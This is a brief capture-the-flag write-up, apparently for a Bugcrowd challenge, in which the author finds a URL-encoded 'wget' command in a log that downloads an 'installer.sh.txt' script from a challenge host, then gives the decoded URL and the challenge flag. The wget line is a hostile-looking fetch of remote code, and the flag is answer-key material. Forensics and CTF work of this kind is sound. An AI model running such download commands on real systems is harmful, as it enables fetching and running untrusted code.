---
ai_date: '2025-04-27 05:13:51'
ai_summary: Executed `wget` command with a URL from the log, likely leading to command
  injection vulnerability.
ai_tags:
- cmd-injection
created: 2024-08-08T09:50
points: 75
updated: 2024-08-17T20:14
---

Just by chance, when cleaning up the log file with `replace`, I ended up on a `cmd`.

![image.png](https://res.cloudinary.com/kumonochisanaka/image/upload/v1723125446/2024/08/8896d79a0f95c9011d5e608e8c696db5.png)

```
wget+https%3A%2F%bugcrowd-leaked.chals.io%2Ff8b7c5a3-9e1d-4f6b-8d2a-3c4e5f6a7b8c%2Finstaller.sh.txt

https://bugcrowd-leaked.chals.io/f8b7c5a3-9e1d-4f6b-8d2a-3c4e5f6a7b8c/installer.sh.txt
```

```flag
flag{Blu3_DA_b@_d3E_d@_ba>d1$%^$%}
```